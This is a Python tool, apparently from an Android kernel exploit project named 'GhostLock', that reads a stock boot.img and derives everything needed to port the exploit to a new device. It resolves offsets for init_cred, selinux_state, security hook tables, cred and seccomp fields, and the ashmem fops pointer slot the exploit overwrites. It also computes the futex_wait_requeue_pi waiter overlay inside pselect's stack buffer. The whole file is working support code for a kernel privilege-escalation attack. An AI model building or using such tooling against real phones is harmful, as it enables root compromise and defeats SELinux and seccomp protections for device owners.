#!/usr/bin/env python3
"""Derive a GhostLock device port from a stock boot.img.

Produces three things, all from the image alone (no device access):

  1. the 28 global offsets that go in src/devices/<name>/offsets.h
  2. the struct field offsets that go in src/devices/<name>/target.h,
     read out of the kernel's embedded BTF
  3. the pselect stack overlay result (waiter word / PSELECT_SHIFT),
     computed statically from the two stack frames plus the syscall
     call-chain depth -- no QEMU kprobe run required

Usage:
    python3 tools/extract_device.py boot.img --name pmg110

Requires: vmlinux-to-elf, capstone   (pip install vmlinux-to-elf capstone)
Optional: lz4                        (for LZ4-compressed kernels)
"""

import argparse
import gzip
import lzma
import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from extract_btf import find_btf, find_struct_in_btf  # noqa: E402

ARM64_MAGIC = b'ARMd'          # at offset 0x38 of a raw arm64 Image
LZ4_LEGACY_MAGIC = 0x184C2102


# --------------------------------------------------------------- unpacking ---

def _lz4_legacy(data):
    try:
        import lz4.block
    except ImportError:
        raise SystemExit('kernel is LZ4-compressed; pip install lz4')
    pos, out = 4, bytearray()
    while pos + 4 <= len(data):
        size, = struct.unpack_from('<I', data, pos)
        pos += 4
        if size in (LZ4_LEGACY_MAGIC, 0) or size > len(data) - pos:
            break
        out += lz4.block.decompress(data[pos:pos + size],
                                    uncompressed_size=8 << 20)
        pos += size
    return bytes(out)


def _decompress(blob):
    """Return a raw arm64 Image from a possibly-compressed kernel blob."""
    if blob[0x38:0x3c] == ARM64_MAGIC:
        return blob
    magic4, = struct.unpack_from('<I', blob, 0)
    if magic4 == LZ4_LEGACY_MAGIC:
        return _lz4_legacy(blob)
    if blob[:3] == b'\x1f\x8b\x08':
        return gzip.decompress(blob)
    if blob[:6] == b'\xfd7zXZ\x00':
        return lzma.decompress(blob)
    if blob[:4] == b'\x28\xb5\x2f\xfd':
        from compression import zstd
        return zstd.decompress(blob)
    # Scan for an embedded compressed stream (kernel appended after a stub).
    for needle, fn in ((struct.pack('<I', LZ4_LEGACY_MAGIC), _lz4_legacy),
                       (b'\x1f\x8b\x08', gzip.decompress),
                       (b'\xfd7zXZ\x00', lzma.decompress)):
        idx = blob.find(needle)
        if idx > 0:
            try:
                return fn(blob[idx:])
            except Exception:
                pass
    raise SystemExit('could not identify kernel compression')


def load_kernel(path):
    blob = open(path, 'rb').read()
    if blob[:8] == b'ANDROID!':
        hv, = struct.unpack_from('<I', blob, 40)
        if hv >= 3:
            ksize, = struct.unpack_from('<I', blob, 8)
            blob = blob[4096:4096 + ksize]
        else:
            ksize, _, _, _, _, _, _, pg = struct.unpack_from('<8I', blob, 8)
            blob = blob[pg:pg + ksize]
    return _decompress(blob)


# ---------------------------------------------------------------- kallsyms ---

def load_symbols(kernel):
    try:
        import logging
        logging.disable(logging.CRITICAL)
        from vmlinux_to_elf.core.kallsyms import KallsymsFinder
    except ImportError:
        raise SystemExit('pip install vmlinux-to-elf')
    finder = KallsymsFinder(kernel)
    syms = {name: sym.virtual_address
            for name, sym in finder.name_to_symbol.items()}
    if '_text' not in syms:
        raise SystemExit('_text not found in kallsyms')
    return syms, syms['_text']


# ------------------------------------------------------------ stack layout ---

def _md():
    try:
        from capstone import Cs, CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN
    except ImportError:
        raise SystemExit('pip install capstone')
    return Cs(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN)


def function_length(syms, addr, cap):
    """Distance to the next symbol above `addr`, bounded by `cap`."""
    higher = [a for a in syms.values() if a > addr]
    return min(cap, min(higher) - addr) if higher else cap


def frame_size(kernel, base, syms, name):
    """Bytes of stack the function claims in its prologue."""
    if name not in syms:
        return None
    md = _md()
    off = syms[name] - base
    total = 0
    for insn in md.disasm(kernel[off:off + 64], syms[name]):
        op = insn.op_str
        if insn.mnemonic == 'sub' and op.startswith('sp, sp, #'):
            total += int(op.split('#')[1], 0)
        elif insn.mnemonic in ('stp', 'str') and '[sp, #-' in op and ']!' in op:
            total += int(op.split('#-')[1].split(']')[0], 0)
        elif insn.mnemonic in ('b', 'br', 'bl', 'ret', 'cbz', 'cbnz'):
            break
    return total


def find_waiter_offset(kernel, base, syms):
    """sp-relative offset of futex_wait_requeue_pi's `struct rt_mutex_waiter`.

    The waiter is only ever taken by address to be handed to the rt_mutex
    proxy helpers, so we take the `add xN, sp, #imm` feeding those calls.
    """
    md = _md()
    fn = syms['futex_wait_requeue_pi']
    start = fn - base
    end = start + function_length(syms, fn, 0x2000)
    targets = {}
    for helper, argreg in (('rt_mutex_wait_proxy_lock', 'x2'),
                           ('rt_mutex_cleanup_proxy_lock', 'x1')):
        if helper in syms:
            targets[syms[helper]] = argreg

    pending = {}
    hits = {}
    # clang emits several epilogues, so scan the whole function rather than
    # stopping at the first `ret`.
    for insn in md.disasm(kernel[start:end], fn):
        op = insn.op_str
        if insn.mnemonic == 'add' and ', sp, #' in op:
            reg = op.split(',')[0].strip()
            pending[reg] = int(op.split('#')[1], 0)
        elif insn.mnemonic == 'bl':
            dst = int(op.lstrip('#'), 0)
            if dst in targets:
                reg = targets[dst]
                if reg in pending:
                    hits.setdefault(pending[reg], []).append(targets[dst])
    if not hits:
        return None, hits
    # The waiter is the offset both helpers agree on.
    best = max(hits.items(), key=lambda kv: len(kv[1]))
    return best[0], hits


def find_stack_fds_offset(kernel, base, syms):
    """sp-relative offset of core_sys_select's 256-byte `stack_fds`."""
    md = _md()
    start = syms['core_sys_select'] - base
    zeros = set()
    for insn in md.disasm(kernel[start:start + 0x400], syms['core_sys_select']):
        op = insn.op_str
        if insn.mnemonic == 'stp' and op.startswith('xzr, xzr, [sp'):
            imm = 0 if '#' not in op else int(op.split('#')[1].rstrip(']'), 0)
            zeros.add(imm)
            zeros.add(imm + 8)
        elif insn.mnemonic == 'str' and op.startswith('xzr, [sp'):
            imm = 0 if '#' not in op else int(op.split('#')[1].rstrip(']'), 0)
            zeros.add(imm)
        elif insn.mnemonic in ('b', 'ret'):
            break
    if not zeros:
        return None
    runs, cur = [], [min(zeros)]
    for z in sorted(zeros)[1:]:
        if z - cur[-1] <= 8:
            cur.append(z)
        else:
            runs.append(cur)
            cur = [z]
    runs.append(cur)
    # stack_fds is SELECT_STACK_ALLOC (256) bytes and is fully zeroed.
    exact = [r for r in runs if r[-1] - r[0] + 8 == 256]
    chosen = exact[0] if exact else max(runs, key=len)
    return chosen[0]


def stack_layout(kernel, base, syms):
    """Statically compute the waiter's word index inside stack_fds.

        waiter_abs = entry_sp_futex  - futex_frame  + waiter_off
        fds_abs    = entry_sp_select - select_frame + fds_off

    Both syscalls enter at the same kernel stack top, so the entry-SP
    difference is just the difference in call-chain depth below the syscall
    dispatcher; everything above that cancels.
    """
    futex_frame = frame_size(kernel, base, syms, 'futex_wait_requeue_pi')
    select_frame = frame_size(kernel, base, syms, 'core_sys_select')
    waiter_off, hits = find_waiter_offset(kernel, base, syms)
    fds_off = find_stack_fds_offset(kernel, base, syms)
    if None in (futex_frame, select_frame, waiter_off, fds_off):
        return None

    futex_chain = ['__arm64_sys_futex', 'do_futex']
    select_chain = ['__arm64_sys_pselect6', 'do_pselect']
    fsum = sum(frame_size(kernel, base, syms, f) or 0 for f in futex_chain)
    ssum = sum(frame_size(kernel, base, syms, f) or 0 for f in select_chain)
    sp_diff = ssum - fsum

    rel = (-futex_frame + waiter_off) - (-select_frame + fds_off)
    waiter_word = (rel + sp_diff) // 8
    return {
        'futex_frame': futex_frame, 'select_frame': select_frame,
        'waiter_off': waiter_off, 'fds_off': fds_off,
        'waiter_helpers': hits,
        'futex_chain': [(f, frame_size(kernel, base, syms, f)) for f in futex_chain],
        'select_chain': [(f, frame_size(kernel, base, syms, f)) for f in select_chain],
        'sp_diff': sp_diff, 'waiter_word': waiter_word,
        # fops.c's words[] is written assuming the waiter starts at word 2,
        # slide.c's words[] indexes the waiter from word 0.
        'pselect_shift': waiter_word - 2,
        'slide_shift': waiter_word,
        # rt_waiter_node layout: lock sits 11 words into the waiter, and only
        # words 0-14 of stack_fds are user controlled (NFDS=320)
        'feasible': -2 <= waiter_word <= 3,
    }


# ----------------------------------------------------------------- offsets ---

FIELD = [
    ('off_init_task', 'init_task'),
    ('off_init_cred', 'init_cred'),
    ('off_init_uts_ns', 'init_uts_ns'),
    ('off_empty_zero_page', 'empty_zero_page'),
    ('off_root_task_group', 'root_task_group'),
    ('off_selinux_enforcing', 'selinux_state'),
    ('off_kptr_restrict', 'kptr_restrict'),
    ('off_selinux_blob_sizes', 'selinux_blob_sizes'),
    ('off_security_hook_heads', 'security_hook_heads'),
    ('off_kmalloc_caches', 'kmalloc_caches'),
    ('off_anon_pipe_buf_ops', 'anon_pipe_buf_ops'),
    # the *bin* variants: fops.c pairs this with configfs_bin_write_iter and
    # drives it through configfs_bin_attribute's buffer (CFG_BIN_* in target.h).
    # A plain configfs_read_iter also exists -- match exactly, never by substring.
    ('off_configfs_read_iter', 'configfs_bin_read_iter'),
    ('off_configfs_bin_write_iter', 'configfs_bin_write_iter'),
    ('off_copy_splice_read', 'copy_splice_read'),
    ('off_noop_llseek', 'noop_llseek'),
    ('off_slide_nfulnl_logger', 'nfulnl_logger'),
    ('off_slide_boot_id', 'sysctl_bootid'),
]

# ashmem is C on most OPPO/realme builds and Rust on recent OnePlus ones.
ASHMEM_C = {
    'off_ashmem_ioctl': 'ashmem_ioctl',
    'off_ashmem_compat_ioctl': 'compat_ashmem_ioctl',
    'off_ashmem_mmap': 'ashmem_mmap',
    'off_ashmem_open': 'ashmem_open',
    'off_ashmem_release': 'ashmem_release',
    'off_ashmem_show_fdinfo': 'ashmem_show_fdinfo',
}
ASHMEM_RUST_FRAGS = {
    'off_ashmem_ioctl': ('fops_ioctl', '6AshmemE5ioctl'),
    'off_ashmem_compat_ioctl': ('fops_compat_ioctl', '6AshmemE12compat_ioctl'),
    'off_ashmem_mmap': ('fops_mmap', '6AshmemE4mmap'),
    'off_ashmem_open': ('fops_open', '6AshmemE4open'),
    'off_ashmem_release': ('fops_release', '6AshmemE7release'),
    'off_ashmem_show_fdinfo': ('fops_show_fdinfo', '6AshmemE11show_fdinfo'),
}
MISCDEVICE_FOPS_OFF = 0x10  # offsetof(struct miscdevice, fops)


def collect_offsets(kernel, syms, base):
    out, missing = {}, []
    for field, sym in FIELD:
        if sym in syms:
            out[field] = syms[sym] - base
        else:
            missing.append(sym)
            out[field] = 0

    # loggers[0][1] is one pointer pair into the loggers array
    out['off_slide_loggers_0_1'] = (
        syms['loggers'] - base + 0x10 if 'loggers' in syms else 0)

    # security_hook_active_capable_* only exists on kernels using static-call
    # LSM hooks; op13-class 6.6 builds do not have it and the exploit treats
    # 0 as "unavailable".
    cap = next((a for n, a in syms.items()
                if n.startswith('security_hook_active_capable')), None)
    out['off_cap_capable_active'] = (cap - base) if cap else 0

    flavour = 'C' if 'ashmem_ioctl' in syms else 'Rust'
    if flavour == 'C':
        for field, sym in ASHMEM_C.items():
            out[field] = syms[sym] - base if sym in syms else 0
            if sym not in syms:
                missing.append(sym)
        out['off_ashmem_fops'] = (
            syms['ashmem_fops'] - base if 'ashmem_fops' in syms else 0)
        # ASHMEM_MISC_FOPS is the *pointer slot* the exploit swaps, i.e. the
        # fops member inside `struct miscdevice ashmem_misc` -- not the
        # file_operations struct itself.
        if 'ashmem_misc' in syms:
            slot = syms['ashmem_misc'] + MISCDEVICE_FOPS_OFF
            out['off_ashmem_misc_fops'] = slot - base
            stored, = struct.unpack_from('<Q', kernel, slot - base)
            if stored != syms.get('ashmem_fops'):
                print(f'  [WARN] ashmem_misc+0x{MISCDEVICE_FOPS_OFF:x} holds '
                      f'0x{stored:016x}, expected &ashmem_fops '
                      f'0x{syms.get("ashmem_fops", 0):016x}')
                out['off_ashmem_misc_fops'] = 0
        else:
            out['off_ashmem_misc_fops'] = 0
    else:
        for field, (frag_new, frag_old) in ASHMEM_RUST_FRAGS.items():
            hit = next((a for n, a in syms.items()
                        if frag_new in n and 'ashmem_rust6Ashmem' in n
                        and 'toggle' not in n.lower()), None)
            if hit is None:
                hit = next((a for n, a in syms.items()
                            if frag_old in n and 'toggle' not in n.lower()), None)
            out[field] = (hit - base) if hit else 0
        ptr = next((a for n, a in syms.items() if 'ASHMEM_FOPS_PTR' in n), None)
        out['off_ashmem_fops'] = (ptr - base) if ptr else 0
        out['off_ashmem_misc_fops'] = 0
    return out, missing, flavour


ORDER = [
    'off_init_task', 'off_init_cred', 'off_init_uts_ns', 'off_empty_zero_page',
    'off_root_task_group', 'off_selinux_enforcing', 'off_kptr_restrict',
    'off_selinux_blob_sizes', 'off_security_hook_heads', 'off_kmalloc_caches',
    'off_anon_pipe_buf_ops', 'off_ashmem_misc_fops', 'off_ashmem_fops',
    'off_ashmem_ioctl', 'off_ashmem_compat_ioctl', 'off_ashmem_mmap',
    'off_ashmem_open', 'off_ashmem_release', 'off_ashmem_show_fdinfo',
    'off_configfs_read_iter', 'off_configfs_bin_write_iter',
    'off_copy_splice_read', 'off_noop_llseek', 'off_cap_capable_active',
    'off_slide_nfulnl_logger', 'off_slide_loggers_0_1', 'off_slide_boot_id',
]


def verify(offsets, syms, base):
    errors, warns = [], []
    text_syms = ('off_configfs_read_iter', 'off_configfs_bin_write_iter',
                 'off_copy_splice_read', 'off_noop_llseek', 'off_ashmem_ioctl',
                 'off_ashmem_mmap', 'off_ashmem_open', 'off_ashmem_release')
    data_syms = ('off_init_task', 'off_init_cred', 'off_selinux_enforcing',
                 'off_root_task_group', 'off_empty_zero_page')
    etext = syms.get('_etext', 0) - base
    for k in text_syms:
        if offsets[k] and etext and offsets[k] > etext:
            errors.append(f'{k}=0x{offsets[k]:X} past _etext 0x{etext:X}')
    for k in data_syms:
        if offsets[k] and etext and offsets[k] < etext:
            errors.append(f'{k}=0x{offsets[k]:X} before _etext (not .data)')
    gap = offsets['off_slide_nfulnl_logger'] - offsets['off_slide_loggers_0_1']
    if not 0 < gap < 0x200:
        warns.append(f'loggers_0_1 -> nfulnl_logger gap=0x{gap:X} (unusual)')
    span = [offsets[k] for k in
            ('off_ashmem_ioctl', 'off_ashmem_mmap', 'off_ashmem_open',
             'off_ashmem_release', 'off_ashmem_show_fdinfo') if offsets[k]]
    if len(span) >= 2 and max(span) - min(span) > 0x10000:
        warns.append(f'ashmem functions span 0x{max(span)-min(span):X}')
    for k in ORDER:
        if offsets[k] == 0 and k not in ('off_cap_capable_active',
                                         'off_ashmem_misc_fops'):
            errors.append(f'{k} is 0 (symbol not resolved)')
    return errors, warns


BTF_STRUCTS = {
    'task_struct': [
        ('usage', 'FAKE_TASK_USAGE_OFF'), ('prio', 'FAKE_TASK_PRIO_OFF'),
        ('normal_prio', 'FAKE_TASK_NORMAL_PRIO_OFF'),
        ('sched_task_group', 'FAKE_TASK_TASK_GROUP_OFF'),
        ('pi_lock', 'FAKE_TASK_PI_LOCK_OFF'),
        ('pi_waiters', 'FAKE_TASK_PI_WAITERS_OFF'),
        ('pi_top_task', 'FAKE_TASK_PI_TOP_TASK_OFF'),
        ('pi_blocked_on', 'FAKE_TASK_PI_BLOCKED_ON_OFF'),
        ('pid', 'TASK_PID_OFF'), ('tgid', 'TASK_TGID_OFF'),
        ('real_parent', 'TASK_REAL_PARENT_OFF'),
        ('atomic_flags', 'TASK_ATOMIC_FLAGS_OFF'),
        ('real_cred', 'TASK_REAL_CRED_OFF'), ('cred', 'TASK_CRED_OFF'),
        ('comm', 'TASK_COMM_OFF'), ('tasks', 'TASK_TASKS_OFF'),
        ('seccomp', 'TASK_SECCOMP_OFF'),
    ],
    'rt_mutex_waiter': [
        ('tree', 'WAITER_TREE_ENTRY_OFF'), ('pi_tree', 'WAITER_PI_TREE_ENTRY_OFF'),
        ('task', 'WAITER_TASK_OFF'), ('lock', 'WAITER_LOCK_OFF'),
        ('wake_state', 'WAITER_WAKE_STATE_OFF'), ('ww_ctx', 'WAITER_WW_CTX_OFF'),
    ],
    'cred': [
        ('uid', 'CRED_UID_OFF'), ('securebits', 'CRED_SECUREBITS_OFF'),
        ('cap_inheritable', 'CRED_CAPS_OFF'), ('security', 'CRED_SECURITY_OFF'),
    ],
    'seccomp': [
        ('mode', 'SECCOMP_MODE_OFF'), ('filter_count', 'SECCOMP_FILTER_COUNT_OFF'),
        ('filter', 'SECCOMP_FILTER_OFF'),
    ],
    'pipe_inode_info': [
        ('head', 'PIPE_HEAD_OFF'), ('tail', 'PIPE_TAIL_OFF'),
        ('max_usage', 'PIPE_MAX_USAGE_OFF'), ('ring_size', 'PIPE_RING_SIZE_OFF'),
        ('nr_accounted', 'PIPE_NR_ACCOUNTED_OFF'), ('readers', 'PIPE_READERS_OFF'),
        ('writers', 'PIPE_WRITERS_OFF'), ('files', 'PIPE_FILES_OFF'),
        ('tmp_page', 'PIPE_TMP_PAGE_OFF'), ('bufs', 'PIPE_BUFS_OFF'),
        ('user', 'PIPE_USER_OFF'),
    ],
    'file_operations': [
        ('owner', 'FOPS_OWNER_OFF'), ('llseek', 'FOPS_LLSEEK_OFF'),
        ('read', 'FOPS_READ_OFF'), ('write', 'FOPS_WRITE_OFF'),
        ('read_iter', 'FOPS_READ_ITER_OFF'), ('write_iter', 'FOPS_WRITE_ITER_OFF'),
        ('unlocked_ioctl', 'FOPS_IOCTL_OFF'),
        ('compat_ioctl', 'FOPS_COMPAT_IOCTL_OFF'), ('mmap', 'FOPS_MMAP_OFF'),
        ('open', 'FOPS_OPEN_OFF'), ('release', 'FOPS_RELEASE_OFF'),
        ('splice_read', 'FOPS_SPLICE_READ_OFF'),
        ('show_fdinfo', 'FOPS_SHOW_FDINFO_OFF'),
    ],
    'slab': [('slab_cache', 'STRUCT_SLAB_CACHE_OFF')],
    'miscdevice': [('fops', 'MISCDEVICE_FOPS_OFF')],
}


def collect_btf(kernel):
    off = find_btf(kernel)
    if off < 0:
        print('  [WARN] no BTF in image; struct offsets unavailable')
        return {}, {}
    hdr_len, = struct.unpack_from('<I', kernel, off + 4)
    to, tl, so, sl = (struct.unpack_from('<I', kernel, off + x)[0]
                      for x in (8, 12, 16, 20))
    td = kernel[off + hdr_len + to: off + hdr_len + to + tl]
    sd = kernel[off + hdr_len + so: off + hdr_len + so + sl]
    result, sizes = {}, {}
    for sname, fields in BTF_STRUCTS.items():
        hits = find_struct_in_btf(td, sd, sname)
        if not hits:
            print(f'  [WARN] BTF struct {sname} not found')
            continue
        size, members = max(hits, key=lambda x: len(x[1]))
        sizes[sname] = size
        md = {n: o for n, o in members}
        for field, define in fields:
            if field in md:
                result[define] = md[field]
    # rt_mutex_waiter.tree is an rt_waiter_node: rb_node(0x18) prio(4) deadline
    if 'WAITER_TREE_ENTRY_OFF' in result:
        t = result['WAITER_TREE_ENTRY_OFF']
        result.setdefault('WAITER_PRIO_OFF', t + 0x18)
        result.setdefault('WAITER_DEADLINE_OFF', t + 0x20)
    return result, sizes


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('image', help='boot.img or a raw/compressed kernel')
    ap.add_argument('--name', default='device', help='device directory name')
    ap.add_argument('--comment', default='', help='header comment line')
    args = ap.parse_args()

    kernel = load_kernel(args.image)
    print(f'[*] kernel image: {len(kernel):,} bytes')
    vpos = kernel.find(b'Linux version ')
    banner = kernel[vpos:vpos + 300].split(b'\x00')[0].decode('ascii', 'replace')
    uname = banner.split()[2]
    print(f'[*] {banner[:110]}')

    syms, base = load_symbols(kernel)
    print(f'[*] {len(syms):,} symbols, _text = 0x{base:016x}')

    offsets, missing, flavour = collect_offsets(kernel, syms, base)
    print(f'[*] ashmem implementation: {flavour}')
    if missing:
        print(f'  [WARN] unresolved: {", ".join(sorted(set(missing)))}')

    errors, warns = verify(offsets, syms, base)
    for w in warns:
        print(f'  [WARN] {w}')
    for e in errors:
        print(f'  [FAIL] {e}')

    layout = stack_layout(kernel, base, syms)
    print()
    print('=' * 68)
    print('  pselect stack overlay')
    print('=' * 68)
    if not layout:
        print('  could not determine layout')
    else:
        for k, v in layout['futex_chain'] + layout['select_chain']:
            print(f'    {k:<26} frame = 0x{(v or 0):x}')
        print(f'    futex_wait_requeue_pi      frame = 0x{layout["futex_frame"]:x}, '
              f'waiter at sp+0x{layout["waiter_off"]:x}')
        print(f'    core_sys_select            frame = 0x{layout["select_frame"]:x}, '
              f'stack_fds at sp+0x{layout["fds_off"]:x}')
        print(f'    entry SP difference        = {layout["sp_diff"]:+d}')
        print(f'    waiter word                = {layout["waiter_word"]}')
        print(f'    FEASIBLE                   = {layout["feasible"]} '
              f'(need -2 <= word <= 3)')
        print(f'    PSELECT_WAITER_WORD_SHIFT  = {layout["pselect_shift"]}'
              f'   (fops.c route; also the PSELECT_SHIFT env override)')
        print(f'    SLIDE_PSELECT_WORD_SHIFT   = {layout["slide_shift"]}'
              f'   (slide.c route)')

    btf, sizes = collect_btf(kernel)

    print()
    print('=' * 68)
    print(f'  src/devices/{args.name}/offsets.h')
    print('=' * 68)
    comment = args.comment or f'{args.name} -- kernel {uname}'
    print(f'/* {comment} */\n')
    print(f'OFFSETS_ENTRY("{uname}",')
    for i in range(0, len(ORDER), 3):
        chunk = ORDER[i:i + 3]
        print('  ' + ' '.join(f'.{k}=0x{offsets[k]:08X},' for k in chunk))
    print('),')

    if btf:
        print()
        print('=' * 68)
        print(f'  struct offsets for src/devices/{args.name}/target.h')
        print('=' * 68)
        for name, size in sorted(sizes.items()):
            print(f'/* sizeof({name}) = 0x{size:x} */')
        for define in sorted(btf):
            print(f'#define {define:<34} 0x{btf[define]:02X}')

    return 1 if errors else 0


if __name__ == '__main__':
    sys.exit(main())
